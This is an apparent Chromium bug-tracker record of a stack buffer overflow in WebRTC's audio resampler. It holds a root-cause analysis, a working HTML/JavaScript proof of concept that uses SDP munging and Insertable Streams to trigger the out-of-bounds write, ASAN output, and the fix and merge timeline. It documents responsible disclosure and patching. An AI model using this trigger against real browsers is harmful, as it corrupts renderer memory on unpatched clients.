# Stack buffer overflow in WebRTC ResamplerHelper::MaybeResample leads to renderer process crash via crafted SDP and Insertable Streams

| Field | Value |
|-------|-------|
| **Issue ID** | [486349161](https://issues.chromium.org/issues/486349161) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebRTC |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | to...@chromium.org |
| **Created** | 2026-02-21 |
| **Bounty** | $11,000.00 |

## Description

## Title

Stack buffer overflow in WebRTC ResamplerHelper::MaybeResample leads to renderer process crash via crafted SDP and Insertable Streams

## Summary

The WebRTC audio resampler contains a stack buffer overflow in `ResamplerHelper::MaybeResample`. When an audio frame decoded by the L16 codec carries a high channel count (up to 24, the maximum allowed by the SDP parser) and the playout sample rate requires resampling, a fixed-size stack buffer of 7680 int16 elements is written with up to 11520 elements, resulting in a 3840-element (7680 byte) out-of-bounds write on the stack. An attacker can trigger this from JavaScript without any experimental flags by using SDP munging to negotiate the L16/32000/24 codec alongside Opus, then switching the RTP payload type at runtime through the Insertable Streams API using the `RTCEncodedAudioFrame` constructor (which bypasses the `RTCEncodedFrameSetMetadata` feature gate). The overflow occurs on the AudioOutputDevice thread inside the renderer process, enabling potential code execution within the compromised sandbox.

## Bisect

Introducing Commit: `c9aaf1198594f23c6572657306cebd2bbde095d8`

- Date: 2024-09-06
- Author: Henrik Lundin [henrik.lundin@webrtc.org](mailto:henrik.lundin@webrtc.org)
- Review: <https://webrtc-review.googlesource.com/c/src/+/361820>

## Root Cause

The vulnerability resides in the "prime the resampler" code path within `ResamplerHelper::MaybeResample` in `third_party/webrtc/modules/audio_coding/acm2/acm_resampler.cc`. This function is called on the audio playout path whenever a decoded audio frame needs to be resampled to match the desired output sample rate.

The function maintains a boolean flag `resampled_last_output_frame_` that tracks whether the previous frame required resampling. When the current frame needs resampling but the previous frame did not, the code enters a "prime" branch that resamples the previously stored audio buffer to warm up the sinc resampler's internal state. The problem is that the destination buffer for this priming operation is a fixed-size stack array, and its view is constructed using dimensions derived from the desired output sample rate and the current frame's channel count, without verifying that the resulting view fits within the array.

```
// third_party/webrtc/modules/audio_coding/acm2/acm_resampler.cc
bool ResamplerHelper::MaybeResample(int desired_sample_rate_hz,
                                    AudioFrame* audio_frame) {
  const bool need_resampling =
      (desired_sample_rate_hz != -1) &&
      (current_sample_rate_hz != desired_sample_rate_hz);

  if (need_resampling && !resampled_last_output_frame_) {
    // Prime the resampler with the last frame.
    InterleavedView<const int16_t> src(last_audio_buffer_.data(),
                                       audio_frame->samples_per_channel(),
                                       audio_frame->num_channels());
    std::array<int16_t, AudioFrame::kMaxDataSizeSamples> temp_output; // 7680
    InterleavedView<int16_t> dst(
        temp_output.data(),
        SampleRateToDefaultChannelSize(desired_sample_rate_hz),
        audio_frame->num_channels_);
    resampler_.Resample(src, dst);  // <-- writes dst.size() elements into temp_output
  }
  // ...
}

```

The constant `AudioFrame::kMaxDataSizeSamples` is 7680, which equals `48000/100 * 16` (480 samples per channel at 48kHz times 16 channels). The `SampleRateToDefaultChannelSize` function returns `sample_rate / 100`, so at 48kHz it returns 480. The `dst` view is therefore sized as `480 * num_channels` elements. When `num_channels` exceeds 16, the view exceeds the buffer capacity: for 24 channels, the view spans `480 * 24 = 11520` elements while the backing array holds only 7680, producing a 3840-element (7680 byte) overwrite past the end of the stack buffer.

The upstream guard in `NetEqImpl::SetSampleRateAndChannels` does enforce a bound, but it validates only the source dimensions, not the destination dimensions:

```
// third_party/webrtc/modules/audio_coding/neteq/neteq_impl.cc
void NetEqImpl::SetSampleRateAndChannels(int fs_hz, size_t channels) {
  RTC_CHECK_LE(channels, kMaxNumberOfAudioChannels);  // channels <= 24
  output_size_samples_ = SampleRateToDefaultChannelSize(fs_hz);
  RTC_CHECK_LE(channels * output_size_samples_,
               AudioFrame::kMaxDataSizeSamples);  // SOURCE check: 320*24=7680 <= 7680 PASS
}

```

For L16/32000/24, the source dimensions pass the check (`320 * 24 = 7680 <= 7680`) because `SampleRateToDefaultChannelSize(32000) = 320`. However, when the playout system requests 48kHz output, the resampler's destination uses `SampleRateToDefaultChannelSize(48000) = 480`, and `480 * 24 = 11520 > 7680`. No check guards this target dimension.

Several other guards that could theoretically catch this condition exist only as `RTC_DCHECK` assertions, which are compiled out in release builds: the `InterleavedView` constructor checks `num_channels <= kMaxNumberOfAudioChannels` via `RTC_DCHECK`, and `PushResampler` enforces a `kMaxNumberOfChannels = 8` limit also via `RTC_DCHECK`. Neither is present in release binaries.

The L16 codec, while marked `NotAdvertised` in the built-in audio decoder factory, can still be negotiated through SDP manipulation. The `NotAdvertised` wrapper only hides the codec from `GetSupportedDecoders()` (preventing it from appearing in default offers), but `SdpToConfig()` and `MakeAudioDecoder()` remain fully functional. The SDP parser accepts up to 24 audio channels, and the L16 decoder's `IsOk()` accepts sample rates of 8, 16, 32, or 48 kHz with 1 to 24 channels.

To reach the vulnerable prime branch, an attacker must arrange for `resampled_last_output_frame_` to be false when the first L16 frame arrives. This is achieved by first streaming audio through a codec whose output sample rate matches the playout rate (e.g. Opus at 48kHz with 48kHz playout), which causes `need_resampling` to be false and sets `resampled_last_output_frame_ = false`. Switching the payload type to L16/32000/24 then produces a frame at 32kHz that requires resampling to 48kHz, entering the prime branch with the stale false value and triggering the overflow.

## Reproduce

Save the following as `poc.html`. Run Chrome with an ASAN build using these flags:

```
ASAN_OPTIONS=detect_odr_violation=0 ./out/asan-release/chrome \
  --no-sandbox --disable-gpu \
  --autoplay-policy=no-user-gesture-required \
  --use-fake-device-for-media-stream \
  --use-fake-ui-for-media-stream \
  --enable-logging=stderr \
  --user-data-dir=$(mktemp -d) \
  file:///path/to/poc.html

```

No experimental flags are required.

```
<!DOCTYPE html>
<html>
<head>
<title>ResamplerHelper Stack OOB Write PoC</title>
<style>
body { background: #1a1a2e; color: #0f0; font-family: monospace; padding: 20px; }
pre { white-space: pre-wrap; word-wrap: break-word; }
</style>
</head>
<body>
<h2>ResamplerHelper priming path stack OOB write</h2>
<pre id="log"></pre>
<script>
const logEl = document.getElementById('log');
function log(msg) {
  const ts = new Date().toISOString().substr(11, 12);
  const line = `[${ts}] ${msg}`;
  logEl.textContent += line + '\n';
  console.log(line);
}
async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// Add L16/32000/24 to SDP alongside existing codecs
function addL16ToSDP(sdp) {
  const lines = sdp.split('\r\n');
  const result = [];
  let inAudio = false, addedL16 = false;
  for (const line of lines) {
    if (line.startsWith('m=audio')) {
      inAudio = true;
      result.push(line + ' 96');
      continue;
    }
    if (inAudio && line.startsWith('m=')) inAudio = false;
    result.push(line);
    if (inAudio && line.startsWith('a=rtpmap:') && !addedL16) {
      result.push('a=rtpmap:96 L16/32000/24');
      addedL16 = true;
    }
  }
  return result.join('\r\n');
}

// Ensure L16/32000/24 is in the answer (add alongside existing codecs)
function ensureL16InAnswer(sdp) {
  if (sdp.includes('L16/32000/24')) return sdp;
  const lines = sdp.split('\r\n');
  const result = [];
  let inAudio = false, addedL16 = false;
  for (const line of lines) {
    if (line.startsWith('m=audio')) {
      inAudio = true;
      result.push(line + ' 96');
      continue;
    }
    if (inAudio && line.startsWith('m=')) inAudio = false;
    result.push(line);
    if (inAudio && line.startsWith('a=rtpmap:') && !addedL16) {
      result.push('a=rtpmap:96 L16/32000/24');
      addedL16 = true;
    }
  }
  return result.join('\r\n');
}

// Generate L16 payload: big-endian 16-bit PCM, numChannels channels
function generateL16Payload(samplesPerChannel, numChannels) {
  const totalSamples = samplesPerChannel * numChannels;
  const buffer = new ArrayBuffer(totalSamples * 2);
  const view = new DataView(buffer);
  for (let i = 0; i < totalSamples; i++) {
    const value = Math.floor(Math.sin(i * 0.1) * 16000);
    view.setInt16(i * 2, value, false); // big-endian (network byte order)
  }
  return buffer;
}

async function run() {
  log('[*] ResamplerHelper stack OOB write PoC');
  log('[*] Strategy: RTCEncodedAudioFrame constructor payload type switch');
  log('[*] 1. Negotiate Opus+L16/32000/24 in initial SDP');
  log('[*] 2. Send Opus 3s (48kHz, no resampling -> resampled_last_output_frame_=false)');
  log('[*] 3. Use new RTCEncodedAudioFrame(chunk, {metadata:{payloadType:96}})');
  log('[*] 4. Receiver decodes L16/32000/24 -> MaybeResample(48kHz) -> prime -> OOB');
  log('');

  const ctx = new AudioContext({ sampleRate: 48000 });
  const osc = ctx.createOscillator();
  osc.frequency.value = 440;
  const dest = ctx.createMediaStreamDestination();
  osc.connect(dest);
  osc.start();
  log('[+] Created 48kHz mono audio source');

  const pc1 = new RTCPeerConnection({ encodedInsertableStreams: true });
  const pc2 = new RTCPeerConnection({ encodedInsertableStreams: true });

  pc1.onicecandidate = e => { if (e.candidate) pc2.addIceCandidate(e.candidate).catch(()=>{}); };
  pc2.onicecandidate = e => { if (e.candidate) pc1.addIceCandidate(e.candidate).catch(()=>{}); };
  pc1.onconnectionstatechange = () => log(`  [pc1] conn=${pc1.connectionState}`);
  pc2.onconnectionstatechange = () => log(`  [pc2] conn=${pc2.connectionState}`);

  pc1.addTrack(dest.stream.getAudioTracks()[0], dest.stream);

  const sender = pc1.getSenders()[0];
  let switchToL16 = false;
  let frameCount = 0;
  const L16_PT = 96;

  // Set up Insertable Streams on sender
  try {
    const senderStreams = sender.createEncodedStreams();
    const transformer = new TransformStream({
      transform(chunk, controller) {
        if (switchToL16) {
          frameCount++;
          try {
            // Generate L16 big-endian PCM: 20 samples/ch * 24ch = 480 samples * 2 = 960 bytes
            const l16Data = generateL16Payload(20, 24);

            // Use RTCEncodedAudioFrame constructor to change payload type
            // This does NOT require RTCEncodedFrameSetMetadata flag!
            const metadata = chunk.getMetadata();
            metadata.payloadType = L16_PT;
            const newFrame = new RTCEncodedAudioFrame(chunk, { metadata });
            newFrame.data = l16Data;

            if (frameCount <= 5 || frameCount % 50 === 0) {
              log(`  [xform] Frame #${frameCount}: PT=${L16_PT}, ${l16Data.byteLength}B`);
            }
            controller.enqueue(newFrame);
            return;
          } catch (e) {
            if (frameCount <= 5) {
              log(`  [xform] Error: ${e.message}`);
            }
          }
        }
        controller.enqueue(chunk);
      }
    });
    senderStreams.readable.pipeThrough(transformer).pipeTo(senderStreams.writable);
    log('[+] Insertable Streams transform ready on sender');
  } catch (e) {
    log('[!] Insertable Streams not available: ' + e.message);
    return;
  }

  // Receive audio on pc2 with pass-through transform
  pc2.ontrack = e => {
    log('[+] pc2 received audio track');
    try {
      const receiver = pc2.getReceivers()[0];
      const recvStreams = receiver.createEncodedStreams();
      recvStreams.readable.pipeTo(recvStreams.writable);
    } catch(e) {}
    const audio = new Audio();
    audio.srcObject = e.streams[0];
    audio.play().catch(()=>{});
  };

  // === Negotiate with both Opus + L16/32000/24 ===
  log('');
  log('=== Negotiating Opus + L16/32000/24 ===');

  const offer = await pc1.createOffer();
  const offerWithL16 = addL16ToSDP(offer.sdp);

  const offerAudio = offerWithL16.split('\r\n').filter(l =>
    l.startsWith('m=audio') || l.includes('rtpmap') || l.includes('L16'));
  log('[*] Offer audio: ' + offerAudio.join(' | '));

  try {
    await pc1.setLocalDescription({ type: 'offer', sdp: offerWithL16 });
    log('[+] pc1 setLocalDescription OK');
  } catch(e) { log('[!] pc1 setLocal FAILED: ' + e); return; }

  try {
    await pc2.setRemoteDescription({ type: 'offer', sdp: offerWithL16 });
    log('[+] pc2 setRemoteDescription OK');
  } catch(e) { log('[!] pc2 setRemote FAILED: ' + e); return; }

  const answer = await pc2.createAnswer();
  const answerWithL16 = ensureL16InAnswer(answer.sdp);
  const answerHadL16 = answer.sdp.includes('L16');
  log(answerHadL16 ? '[+] L16 naturally in answer!' : '[*] L16 not in answer, adding via SDP munge');

  const answerAudio = answerWithL16.split('\r\n').filter(l =>
    l.startsWith('m=audio') || l.includes('rtpmap') || l.includes('L16'));
  log('[*] Answer audio: ' + answerAudio.join(' | '));

  try {
    await pc2.setLocalDescription({ type: 'answer', sdp: answerWithL16 });
    log('[+] pc2 setLocalDescription OK');
  } catch(e) { log('[!] pc2 setLocal FAILED: ' + e); return; }

  try {
    await pc1.setRemoteDescription({ type: 'answer', sdp: answerWithL16 });
    log('[+] pc1 setRemoteDescription OK');
  } catch(e) { log('[!] pc1 setRemote FAILED: ' + e); return; }

  log('[+] Negotiation complete (Opus + L16/32000/24 both available)');

  // Wait for connection
  await new Promise((resolve, reject) => {
    const timeout = setTimeout(() => reject(new Error('Connection timeout')), 10000);
    const check = () => {
      if (pc1.connectionState === 'connected') { clearTimeout(timeout); return resolve(); }
      if (pc1.connectionState === 'failed') { clearTimeout(timeout); return reject(new Error('Connection failed')); }
      pc1.addEventListener('connectionstatechange', check, { once: true });
    };
    check();
  });
  log('[+] Connection established!');

  // === Phase 1: Opus audio for 3s ===
  log('');
  log('=== Phase 1: Opus audio (48kHz, no resampling) ===');
  log('[*] This sets resampled_last_output_frame_=false on receiver');
  await sleep(3000);
  log('[+] 3s Opus audio complete');

  // === Phase 2: Switch to L16 payload type ===
  log('');
  log('=== Phase 2: Switching to L16/32000/24 payload type ===');
  log('[*] L16 decode -> 32kHz/24ch -> MaybeResample(48kHz)');
  log('[*] Prime branch: dst(480*24=11520) > temp_output[7680] -> OOB!');
  switchToL16 = true;

  for (let i = 0; i < 15; i++) {
    await sleep(1000);
    log(`[${i+1}s] pc1=${pc1.connectionState} pc2=${pc2.connectionState} L16frames=${frameCount}`);

    try {
      const stats = await sender.getStats();
      stats.forEach(s => {
        if (s.type === 'outbound-rtp' && s.kind === 'audio') {
          log(`  [send] pkts=${s.packetsSent} bytes=${s.bytesSent}`);
        }
      });
    } catch(e) {}

    try {
      const receivers = pc2.getReceivers();
      if (receivers.length > 0) {
        const stats = await receivers[0].getStats();
        stats.forEach(s => {
          if (s.type === 'inbound-rtp' && s.kind === 'audio') {
            log(`  [recv] pkts=${s.packetsReceived} bytes=${s.bytesReceived}`);
          }
        });
      }
    } catch(e) {}
  }

  log('[*] Test complete');
  pc1.close(); pc2.close(); ctx.close();
}

run().catch(e => log('[!] Fatal: ' + e));
</script>
</body>
</html>

```

ASAN output (no experimental flags):

```
=================================================================
==2867488==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7a2986e5bc20 at pc 0x7f84b2898012 bp 0x7a29878c3170 sp 0x7a29878c3168
WRITE of size 2 at 0x7a2986e5bc20 thread T19 (AudioOutputDevi)
    #0 0x7f84b2898011 in webrtc::PushResampler<short>::Resample(webrtc::InterleavedView<short const>, webrtc::InterleavedView<short>) third_party/webrtc/common_audio/include/audio_util.h:157:36
    #1 0x7f84b2b73520 in webrtc::acm2::ResamplerHelper::MaybeResample(int, webrtc::AudioFrame*) third_party/webrtc/modules/audio_coding/acm2/acm_resampler.cc:50:16
    #2 0x7f84b2b0701d in webrtc::voe::(anonymous namespace)::ChannelReceive::GetAudioFrameWithInfo(int, webrtc::AudioFrame*) third_party/webrtc/audio/channel_receive.cc:422:21
    #3 0x7f84b2d09374 in webrtc::AudioMixerImpl::GetAudioFromSources(int) third_party/webrtc/modules/audio_mixer/audio_mixer_impl.cc:137:42
    #4 0x7f84b2d08f7e in webrtc::AudioMixerImpl::Mix(unsigned long, webrtc::AudioFrame*) third_party/webrtc/modules/audio_mixer/audio_mixer_impl.cc:107:27
    #5 0x7f84b2aff0fa in webrtc::AudioTransportImpl::PullRenderData(int, int, unsigned long, unsigned long, void*, long*, long*) third_party/webrtc/audio/audio_transport_impl.cc:273:11
    #6 0x7f84640f4641 in blink::WebRtcAudioDeviceImpl::RenderData(media::AudioBus*, int, base::TimeDelta, base::TimeDelta*, media::AudioGlitchInfo const&) third_party/blink/renderer/modules/webrtc/webrtc_audio_device_impl.cc:117:30
    #7 0x7f846410667a in blink::WebRtcAudioRenderer::SourceCallback(int, media::AudioBus*) third_party/blink/renderer/modules/webrtc/webrtc_audio_renderer.cc:647:12
    #8 0x7f8464105f61 in blink::WebRtcAudioRenderer::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) third_party/blink/renderer/modules/webrtc/webrtc_audio_renderer.cc:601:5
    #9 0x7f84b60b0292 in media::AudioOutputDeviceThreadCallback::Process(unsigned int) media/audio/audio_output_device_thread_callback.cc:107:21
    #10 0x7f84b607151b in media::AudioDeviceThread::ThreadMain() media/audio/audio_device_thread.cc:114:18
    #11 0x7f84cbedde8c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #12 0x55c277680616 in asan_thread_start(void*) asan_interceptors.cpp

Address 0x7a2986e5bc20 is located in stack of thread T19 (AudioOutputDevi) at offset 15392 in frame
    #0 0x7f84b2b7329f in webrtc::acm2::ResamplerHelper::MaybeResample(int, webrtc::AudioFrame*) third_party/webrtc/modules/audio_coding/acm2/acm_resampler.cc:28

  This frame has 4 object(s):
    [32, 15392) 'temp_output' (line 45) <== Memory access at offset 15392 overflows this variable
    [15648, 15680) 'src' (line 57)
    [15712, 15744) 'dst' (line 59)
    [15776, 15808) 'ref.tmp' (line 73)

SUMMARY: AddressSanitizer: stack-buffer-overflow third_party/webrtc/common_audio/include/audio_util.h:157:36 in webrtc::PushResampler<short>::Resample(webrtc::InterleavedView<short const>, webrtc::InterleavedView<short>)
Shadow bytes around the buggy address:
  0x7a2986e5b980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7a2986e5ba00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7a2986e5ba80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7a2986e5bb00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7a2986e5bb80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7a2986e5bc00: 00 00 00 00[f2]f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
  0x7a2986e5bc80: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
  0x7a2986e5bd00: f2 f2 f2 f2 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8
  0x7a2986e5bd80: f2 f2 f2 f2 f8 f8 f8 f8 f3 f3 f3 f3 f3 f3 f3 f3
==2867488==ABORTING

```
## Credit

Please use c6eed09fc8b174b0f3eebedcceb1e792 as the credit for this vulnerability. Thank you.

## Timeline

### cl...@appspot.gserviceaccount.com (2026-02-23)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6506107358871552.

### an...@chromium.org (2026-02-23)

tommi, hta: clusterfuzz has repro'd the testcase. Can you PTAL? Thanks.

### 24...@project.gserviceaccount.com (2026-02-24)

Detailed Report: https://clusterfuzz.com/testcase?key=6506107358871552

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Stack-buffer-overflow WRITE 2
Crash Address: 0x779061973c20
Crash State:
  webrtc::PushResampler<short>::Resample
  webrtc::acm2::ResamplerHelper::MaybeResample
  webrtc::voe::ChannelReceive::GetAudioFrameWithInfo
  
Sanitizer: address (ASAN)

Recommended Security Severity: Critical

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&revision=1588674

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6506107358871552

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### ch...@google.com (2026-02-24)

Setting Priority to P0 to match Severity s0. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### aj...@google.com (2026-02-24)

CC original CL authors & webrtc owners and adding FoundIn=144 for current Extended Stable.

### ch...@google.com (2026-02-25)

Setting milestone because of s0/s1 severity.

### dx...@google.com (2026-03-06)

Project: src  

Branch:  main  

Author:  Tommi [tommi@webrtc.org](mailto:tommi@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/454000>

Check maximum buffer size in ResamplerHelper::MaybeResample

---


Expand for full commit details
```
     
    Verify that the target sample count does not exceed the maximum allowed 
    size for an AudioFrame. Previously, requesting a resample operation with 
    a high number of channels or a high sample rate could result in a target 
    data size that exceeded the internal limits of the AudioFrame class. 
     
    This change adds a validation check before starting the resampling 
    process. If the calculated target size—based on the desired sample rate 
    and channel count—surpasses kMaxDataSizeSamples, the operation now 
    safely aborts. In such cases, the error is logged, the audio frame is 
    muted to avoid undefined behavior, and the function returns false. 
     
    Bug: chromium:486349161 
    Fixes: chromium:486349161 
    Change-Id: Ia0d8abcd390f90a590c07c0606f9b6c968f663e6 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/454000 
    Reviewed-by: Per Åhgren <peah@webrtc.org> 
    Reviewed-by: Henrik Lundin <henrik.lundin@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Cr-Commit-Position: refs/heads/main@{#47076}

```

---

Files:

- M `modules/audio_coding/BUILD.gn`
- M `modules/audio_coding/DEPS`
- M `modules/audio_coding/acm2/acm_resampler.cc`
- A `modules/audio_coding/acm2/acm_resampler_unittest.cc`

---

Hash: ecde302f3f4e4f4149ad7eda697bb9309955e57d  

Date: Fri Mar 6 08:37:17 2026


---

### dx...@google.com (2026-03-06)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7643296>

Roll WebRTC from 7f5a8b656cf6 to ecde302f3f4e (1 revision)

---


Expand for full commit details
```
     
    https://webrtc.googlesource.com/src.git/+log/7f5a8b656cf6..ecde302f3f4e 
     
    2026-03-06 tommi@webrtc.org Check maximum buffer size in ResamplerHelper::MaybeResample 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/webrtc-chromium-autoroll 
    Please CC webrtc-chromium-sheriffs-robots@google.com,webrtc-infra@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in WebRTC: https://bugs.chromium.org/p/webrtc/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Bug: chromium:486349161 
    Tbr: webrtc-chromium-sheriffs-robots@google.com 
    Change-Id: I8d7622fc23ceaf4a090141bf74eaf43d8479a84e 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7643296 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1595400}

```

---

Files:

- M `DEPS`
- M `third_party/webrtc`

---

Hash: [136612f2cd0a65988c5474087f5bb8f0d9883d30](https://chromiumdash.appspot.com/commit/136612f2cd0a65988c5474087f5bb8f0d9883d30)  

Date: Fri Mar 6 15:22:38 2026


---

### ch...@google.com (2026-03-07)

Security Merge Request Consideration: Requesting merge to extended stable (M144) because latest trunk commit (1595400) appears to be after extended stable branch point (1552494).
Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1595400) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1595400) appears to be after beta branch point (1582197).
Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [144, 145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### 24...@project.gserviceaccount.com (2026-03-07)

ClusterFuzz testcase 6506107358871552 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1595384:1595409

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### dr...@chromium.org (2026-03-09)

No crashes in Canary. Approving merge to M146. We don't plan more releases for M144 or M145, so removing those labels.

### dx...@google.com (2026-03-12)

Project: src  

Branch:  refs/branch-heads/7680  

Author:  Tommi [tommi@webrtc.org](mailto:tommi@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/456340>

[146] Check maximum buffer size in ResamplerHelper::MaybeResample

---


Expand for full commit details
```
     
    Verify that the target sample count does not exceed the maximum allowed 
    size for an AudioFrame. Previously, requesting a resample operation with 
    a high number of channels or a high sample rate could result in a target 
    data size that exceeded the internal limits of the AudioFrame class. 
     
    This change adds a validation check before starting the resampling 
    process. If the calculated target size—based on the desired sample rate 
    and channel count—surpasses kMaxDataSizeSamples, the operation now 
    safely aborts. In such cases, the error is logged, the audio frame is 
    muted to avoid undefined behavior, and the function returns false. 
     
    (cherry picked from commit ecde302f3f4e4f4149ad7eda697bb9309955e57d) 
     
    Bug: chromium:486349161 
    Fixes: chromium:486349161 
    Change-Id: Ia0d8abcd390f90a590c07c0606f9b6c968f663e6 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/454000 
    Reviewed-by: Per Åhgren <peah@webrtc.org> 
    Reviewed-by: Henrik Lundin <henrik.lundin@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#47076} 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/456340 
    Reviewed-by: Jeremy Leconte <jleconte@google.com> 
    Cr-Commit-Position: refs/branch-heads/7680@{#2} 
    Cr-Branched-From: d1972add2a63b2a528a6471d447f82e0010b5215-refs/heads/main@{#46853}

```

---

Files:

- M `modules/audio_coding/BUILD.gn`
- M `modules/audio_coding/DEPS`
- M `modules/audio_coding/acm2/acm_resampler.cc`
- A `modules/audio_coding/acm2/acm_resampler_unittest.cc`

---

Hash: eac26aa4a210b14e7556bddf9c18a14cc5711872  

Date: Fri Mar 6 08:37:17 2026


---

### pe...@google.com (2026-03-12)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### wf...@chromium.org (2026-03-18)

code exec in renderer is high sev.

### sp...@google.com (2026-03-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
High-quality report of demonstrated memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### pe...@google.com (2026-04-02)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-04-02)

1. https://webrtc-review.git.corp.google.com/c/src/+/458263
2. Medium - There were some conflicts. So the original patch author removed the added test in the cherry-picked CL.
3. 146.
4. Yes. the bug was introduced in 2024. 

### an...@google.com (2026-04-03)

Merge approved for LTS-138.

### dx...@google.com (2026-04-08)

Project: src  

Branch:  refs/branch-heads/7204  

Author:  Tommi [tommi@webrtc.org](mailto:tommi@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/458263>

[M138] Check maximum buffer size in ResamplerHelper::MaybeResample

---


Expand for full commit details
```
     
    Verify that the target sample count does not exceed the maximum allowed 
    size for an AudioFrame. Previously, requesting a resample operation with 
    a high number of channels or a high sample rate could result in a target 
    data size that exceeded the internal limits of the AudioFrame class. 
     
    This change adds a validation check before starting the resampling 
    process. If the calculated target size—based on the desired sample rate 
    and channel count—surpasses kMaxDataSizeSamples, the operation now 
    safely aborts. In such cases, the error is logged, the audio frame is 
    muted to avoid undefined behavior, and the function returns false. 
     
    (cherry picked from commit ecde302f3f4e4f4149ad7eda697bb9309955e57d) 
     
    No-try: true 
    Bug: chromium:486349161 
    Fixes: chromium:486349161 
    Change-Id: Ia0d8abcd390f90a590c07c0606f9b6c968f663e6 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/454000 
